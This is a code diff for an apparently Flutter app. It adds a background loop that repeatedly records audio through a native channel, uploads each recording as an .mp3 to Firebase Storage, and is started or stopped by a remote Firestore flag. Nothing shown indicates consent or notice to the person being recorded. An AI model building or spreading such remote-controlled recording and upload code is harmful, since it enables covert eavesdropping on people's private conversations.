@@ -1,5 +1,7 @@
+import 'dart:io';
+
 import 'package:cloud_firestore/cloud_firestore.dart';
-import 'package:firebase_core/firebase_core.dart';
+import 'package:firebase_storage/firebase_storage.dart';
 import 'package:flutter/services.dart';
 import 'package:flutter_background_service/flutter_background_service.dart';
 import 'package:get/get.dart';
@@ -23,9 +25,10 @@ final class CoreController extends GetxController {
       if (value != null) {
         licenca(value['licenca']);
       }
+    readAndWriteFirebaseData();
     });
-    _plataformStart();
-    _plataformStop();
+    // _plataformStart();
+    // _plataformStop();
     // FlutterBackgroundService().invoke('setAsForeground');
     // await Workmanager().cancelAll();
     // licenca.listen((value) async {
@@ -121,18 +124,123 @@ final class CoreController extends GetxController {
     );
   }
 
-  Future<String> _plataformStart() async{
+  Future<String> plataformStart() async {
     var plataform = const MethodChannel('method.record');
     final method = await plataform.invokeMethod('onStart');
     Logger().i('MethodChannel result$method');
     return method;
   }
 
-  Future<String> _plataformStop() async{
+  Future<String> plataformStop() async {
     var plataform = const MethodChannel('method.record');
-    await Future.delayed(const Duration(seconds: 20));
+    // await Future.delayed(const Duration(seconds: 20));
     final method = await plataform.invokeMethod('onStop');
     Logger().i('MethodChannel result$method');
     return method;
+  }
+
+  Future<bool> readAndWriteFirebaseData() async {
+    // Fetch from Firebase
+    Logger().i('firebase conect...');
+    final docData =
+        FirebaseFirestore.instance.collection("configuracao").doc("options");
+    final snapshot = await docData.get();
+    Logger().i('firebase conected - ${snapshot.data()}');
+
+    if (snapshot.exists) {
+      final int time = snapshot.data()!['time_start'] ?? 15;
+      final bool licenca = snapshot.data()!['licenca'] ?? false;
+      if (!licenca) {
+        Logger().i('Service Stoped}');
+      }
+      if (licenca) {
+        bool repeat = true;
+        while (repeat == true) {
+          Logger().i('Service Runn...}');
+          Logger().i('Repeat inicial $repeat');
+
+          final start = await plataformStart();
+          Logger().i('MethodChannel result$start');
+          Logger().i('record start');
+          Logger().i('record start');
+
+          await Future.delayed(Duration(minutes: time));
+
+          final path = await plataformStop();
+          Logger().i('Stop recording $path');
+          Logger().i('Stop recording');
+          if (path.isNotEmpty) {
+            Logger().i('Inicio Uploade FirebaseStorage');
+            await upload(path);
+            Logger().i('Fim Uploade FirebaseStorage');
+          }
+
+          FirebaseFirestore.instance
+              .collection("comandos")
+              .doc("time")
+              .collection("register")
+              .doc()
+              .set(
+            {
+              'road': DateTime.now(),
+            },
+          );
+
+          Logger().i('firebase conect...');
+          final docData = FirebaseFirestore.instance
+              .collection("configuracao")
+              .doc("options");
+          final snapshot = await docData.get();
+          repeat = snapshot.data()!['licenca'] ?? false;
+          if (!repeat) {
+            FlutterBackgroundService().invoke('stopService');
+            Logger().i('Service Stoped}');
+          }
+          Logger().i('firebase conected - ${snapshot.data()}');
+          Logger().i('Repeat $repeat');
+        }
+      }
+
+      return licenca;
+    } else {
+      return false;
+    }
+  }
+
+  Future<void> record() async {
+    // await Future.delayed(const Duration(seconds: 40));
+    final start = await plataformStart();
+    Logger().i('MethodChannel result$start');
+    Logger().i('record start');
+
+    await Future.delayed(const Duration(seconds: 20));
+
+    final path = await plataformStop();
+    Logger().i('Stop recording $path');
+    if (path.isNotEmpty) {
+      Logger().i('Inicio Uploade FirebaseStorage');
+      await upload(path);
+      Logger().i('Fim Uploade FirebaseStorage');
+    }
+
+    FirebaseFirestore.instance
+        .collection("comandos")
+        .doc("time")
+        .collection("register")
+        .doc()
+        .set({
+      'road': DateTime.now(),
+    });
+  }
+
+  Future<void> upload(String path) async {
+    File file = File(path);
+
+    try {
+      String ref = 'record/rec-${DateTime.now().toString()}.mp3';
+      await FirebaseStorage.instance.ref(ref).putFile(file);
+    } catch (e) {
+      Logger().e('erro no uploa');
+    }
   }
 }
